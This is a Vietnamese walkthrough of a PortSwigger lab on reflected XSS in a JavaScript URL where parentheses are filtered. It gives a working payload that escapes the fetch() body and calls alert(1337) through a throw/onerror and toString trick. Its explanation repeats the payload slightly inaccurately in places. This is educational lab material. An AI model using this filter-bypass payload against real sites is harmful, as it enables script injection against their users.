# Lab: Reflected XSS in a JavaScript URL with some characters blocked

>  Cấp độ: Expert

## Description

> This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge;  however, the application is blocking some characters in an attempt to  prevent [XSS](https://portswigger.net/web-security/cross-site-scripting) attacks.        
>
> To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function with the string `1337` contained somewhere in the `alert` message.        

## Step by step

1. Bước đầu tiên cần xác định xem các kí tự nào bị filter

   + danh sách đầy đủ các kí tự đặc biệt:``` /><\'"=;*&,()`{}```
   + các kí tự được phép bên trong URL javascript: ```/><\'"=;*&\`,{}```
   + các kí tự bị ban:` ()`

   Chúng ta thấy dấu `()` bị mã hóa html nên không thể sử dụng tag để thực thi alert như yêu cầu đề bài

2. Xem nguồn trang và thấy rằng có thể  XSS được phản ánh trong URL dựa trên javascript:fetch()

   ![image](https://user-images.githubusercontent.com/68894302/172291404-b97f4672-a037-4bc3-bc45-ba7de56bebc2.png)

   Decode ra sẽ như sau:

   ``` javascript
   javascript:fetch('/analytics', {method:'post',body:'/post?postId=2&'}'}).finally(_ => window.location = '/')
   ```

​				=> có thể escape ra khỏi phần fetch json bằng kí tự `&'}`

## Exploit

Ý tưởng là sau khi escape ra khỏi chuỗi, đóng `}` rồi thì làm thế nào để thực thi được `alert(1337)` mỗi khi người dùng nhấn quay trở lại blog

``` html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=1&%27}payload}).finally(_ => window.location = '/')">Back to Blog</a>
```

Sau khi decode ta có dạng như sau

``` html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=1&'}payload}).finally(_ => window.location = '/')">Back to Blog</a>
```

Payload cuối cùng(URL decode)

```javascript
fetch('/analytics', {method:'post',body:'/post?postId=1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
```

Giải thích tạo sao payload trên lại hoạt động:

+ `&`  thêm một tham số mới để thoát khỏi postId, 

+ `'}'` thoát khỏi body: `'/post?postId=1'`, đoạn code sau đó sẽ như sau: 

  `fetch('/analytics', {method:'post',body:'/post?postId=1&'}'}).finally(_ =>window.location= '/')`

+ `,x=x=>{throw/**/alert,1337}, toString=x,window+'',` làm một cách để bypass () bằng cách sử dụng câu lệnh`throw` như đã đề cập trong phần lí thuyết

  ![image-20220607113123009](C:/Users/tuandv/AppData/Roaming/Typora/typora-user-images/image-20220607113123009.png)

  Về cơ bản nó ghi đè lên `toString` và kích hoạt nó, `toString=alert()` không hoạt động vì `(` và `)` bị chặn, các dấu `,` để không phá vỡ javascript

+ `x{:'` để không phá vỡ code javascript

![image](https://user-images.githubusercontent.com/68894302/172300723-9a59ba2a-3856-467c-b059-77c98fa2ae78.png)